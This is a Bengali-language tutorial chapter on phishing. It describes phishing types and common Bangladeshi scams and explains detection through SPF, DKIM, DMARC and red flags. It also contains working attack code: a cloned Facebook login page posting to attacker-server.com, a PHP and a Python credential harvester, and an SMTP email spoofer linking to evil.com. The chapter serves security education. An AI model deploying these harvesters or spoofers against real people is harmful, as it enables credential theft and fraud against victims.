# অধ্যায় ১৮: Phishing Attacks

## সহজ কথায়:
Phishing = মাছ ধরার মতো। তুমি একটা টোপ দাও (fake email/message), আর victim সেটায় কামড় দেয়। **৯০% হ্যাক শুরু হয় phishing দিয়ে।**

---

## ১৮.১ Phishing কী, কত ধরনের

Phishing = প্রতারণামূলক message/website যা genuine মনে হয় কিন্তু আসলে তোমার credential চুরি করে।

### Phishing-এর প্রকার:

| টাইপ | Target | উদাহরণ |
|------|--------|---------|
| **Spear Phishing** | নির্দিষ্ট ব্যক্তি | CEO-কে mail: "তোমার account block" |
| **Whaling** | Top executive | CFO কে fake invoice |
| **Smishing** | SMS মাধ্যমে | "bKash bonus পেতে ক্লিক করুন" |
| **Vishing** | Voice call | "আমি GP থেকে বলছি, আপনার OTP দিন" |
| **Clone Phishing** | Legitimate email copy | Real email-এর clone + malicious link |
| **Angler Phishing** | Social media | Fake customer support |

### বাংলাদেশে Common Scams:
```
1. "আপনি ১০ লাখ টাকা জিতেছেন" — SMS
2. "bKash account block হবে" — fake link
3. "Nagad bonus" — phishing site
4. "Facebook page verify" — fake email
5. "GP offer" — fake SMS
```

---

## ১৮.২ Spear Phishing vs Whaling

### Spear Phishing (নির্দিষ্ট ব্যক্তি):
```
Step 1: Target নির্বাচন — রহিম সাহেব, IT admin
Step 2: OSINT — রহিম সাহেবের email, Facebook, LinkedIn
Step 3: Personalized email তৈরি
         "প্রিয় রহিম সাহেব, আপনার company-র security audit report দেখুন"
Step 4: Malicious link/attachment
Step 5: Victim clicks → credential চুরি
```

### Whaling (বড় মাছ):
```
Step 1: CEO/CFO identify করো
Step 2: Urgent financial matter
         "জরুরি! $50,000 transfer urgent"
Step 3: Fake invoice attached
Step 4: Victim panic করে → action নেয়
Step 5: $50,000 eaten!
```

---

## ১৮.৩ Fake Login Page বানানো (HTML/JS)

### Complete Phishing Page:

```html
<!DOCTYPE html>
<html lang="bn">
<head>
    <title>Facebook Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            margin-top: 100px;
        }
        .login-box {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            width: 400px;
        }
        input {
            width: 95%;
            padding: 14px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 6px;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Facebook-এ লগইন করুন</h2>
        <form method="POST" action="https://attacker-server.com/capture.php">
            <!-- 📌 সাবধান! এইটার action = attacker-এর server -->
            <input type="text" name="email" placeholder="ইমেইল বা ফোন" required>
            <input type="password" name="pass" placeholder="পাসওয়ার্ড" required>
            <button type="submit">লগইন</button>
        </form>
        <p style="color: #666; font-size: 12px; margin-top: 20px;">
            🔒 আপনার তথ্য নিরাপদ
        </p>
    </div>
</body>
</html>
```

### Server Side (PHP — data capture):

```php
<?php
// capture.php — victim-এর data capture করে
$email = $_POST['email'];
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');

// File-এ save
$data = "Time: $time | IP: $ip | Email: $email | Pass: $password\n";
file_put_contents('stolen_data.txt', $data, FILE_APPEND);

// Victim কে real Facebook-এ redirect (সে কিছু বুঝবে না)
header('Location: https://facebook.com');
exit;
?>
```

### Python - Simple Phishing Server:

```python
#!/usr/bin/env python3
# Simple credential harvester — EDUCATIONAL ONLY
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Fake login page দেখাও
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        with open('facebook_login.html', 'rb') as f:
            self.wfile.write(f.read())

    def do_POST(self):
        # Credential capture
        length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(length).decode()
        params = urllib.parse.parse_qs(post_data)

        email = params.get('email', [''])[0]
        password = params.get('pass', [''])[0]

        # Save to file
        with open('captured.txt', 'a') as f:
            f.write(f"[{email}:{password}]\n")

        print(f"🎣 Captured! {email}:{password}")

        # Real site-এ redirect
        self.send_response(302)
        self.send_header('Location', 'https://facebook.com')
        self.end_headers()

# Run server
server = HTTPServer(('0.0.0.0', 80), PhishingHandler)
print("🎣 Phishing server running on port 80...")
server.serve_forever()
```

---

## ১৮.৪ Email Spoofing — কীভাবে হয়

Email spoofing = **From address forge** করে genuine মনে হওয়া email পাঠানো।

### SMTP Direct (No Auth):

```bash
# সরাসরি SMTP connection — no authentication
# শুধু port 25 open থাকলেই কাজ করে (যা এখন rare)

# Telnet দিয়ে:
telnet mail.example.com 25

HELO attacker.com
MAIL FROM: ceo@victim-company.com
RCPT TO: finance@victim-company.com
DATA
Subject: জরুরি! Payment transfer

প্রিয় ফাইন্যান্স টিম,
নিচের account-এ $10,000 urgent transfer করুন।
- CEO
.
QUIT
```

### Python Email Spoofer:

```python
#!/usr/bin/env python3
# Email spoofing demonstration — EDUCATIONAL
import smtplib
from email.mime.text import MIMEText

def send_spoofed_email():
    msg = MIMEText("""
    প্রিয় গ্রাহক,

    আপনার Facebook account-এ suspicious activity detected।
    নিচের লিংকে ক্লিক করে আপনার account verify করুন:
    http://evil.com/facebook-login

    ধন্যবাদ,
    Facebook Security Team
    """)

    msg['Subject'] = '⚠️ Security Alert - Facebook'
    msg['From'] = 'security@facebook.com'  # Spoofed!
    msg['To'] = 'victim@gmail.com'

    try:
        # SMTP server (যদি open relay থাকে)
        server = smtplib.SMTP('smtp.example.com', 25)
        server.send_message(msg)
        server.quit()
        print("✅ Spoofed email sent!")
    except Exception as e:
        print(f"❌ Failed: {e}")

send_spoofed_email()
```

### SPF, DKIM, DMARC — Email Defense:

| Protocol | কাজ | Check করে |
|----------|-----|-----------|
| **SPF** | কোন server থেকে email পাঠানো allowed | Sender IP |
| **DKIM** | Digital signature verify | Email integrity |
| **DMARC** | SPF/DKIM fail হলে কী করবে | Policy |

---

## ১৮.৫ Phishing ধরার উপায়

### কীভাবে Phishing Email চিনবে:

```
✅ Check করো → From address (display name != actual email)

✅ Hover করো → link-এর উপর mouse নাও (নিচে real URL দেখাবে)

✅ Check করো → Spelling mistakes, bad grammar

✅ Check করো → Urgency ("তাড়াতাড়ি করুন, ২৪ ঘণ্টার মধ্যে")

✅ Check করো → Suspicious attachment (.exe, .docm, .zip)

✅ Check করো → Email header analysis (Return-Path vs From)
```

### ১০টা Red Flag:
```
১. "Dear Customer" (personalized না)
২. Abnormal sender address
৩. Spelling/grammar error
৪. Threat/urgency
৫. Suspicious link (hover করে দেখো)
৬. Unexpected attachment
৭. Request for personal info
৮. Too good to be true offer
৯. Mismatched domain (faceb00k.com)
১০. Unsolicited OTP request
```

### Phishing Report Tools:

```bash
# Browser extension:
# PhishTank, Netcraft, Avast Online Security

# Report phishing:
# Bangladesh: www.cert.gov.bd
# International: reportphishing@apwg.org
# Google: safebrowsing.google.com
```

---

## 💡 ল্যাব এক্সারসাইজ

```
⚠️ শুধু নিজের local lab-এ practice করো। কখনো real victim না!

১. Fake login page বানাও (যে কোনো site)
   - HTML page তৈরি
   - Local Python server চালাও
   - Browser-এ দেখো কেমন দেখাচ্ছে

২. Email spoofing test (তোমার নিজের email-এ):
   - Python script দিয়ে fake email পাঠাও
   - দেখো SPF/DKIM fail হচ্ছে কিনা

৩. Phishing detection test:
   - আপনার email-এ phishing mail আছে কিনা check করো
   - Email header analysis করো
   - Red flag চিহ্নিত করো
```

---

## 📌 মনে রাখো

| Concept | Key Point |
|---------|-----------|
| **Phishing** | ৯০% attack phishing দিয়ে শুরু |
| **Spear Phishing** | নির্দিষ্ট target |
| **Whaling** | CEO/CFO target |
| **Email Spoofing** | From address forge |
| **SPF/DKIM/DMARC** | Email authentication |
| **Suspicious link** | Hover করে check করো |

**পরবর্তী অধ্যায় — Malware! 🦠**
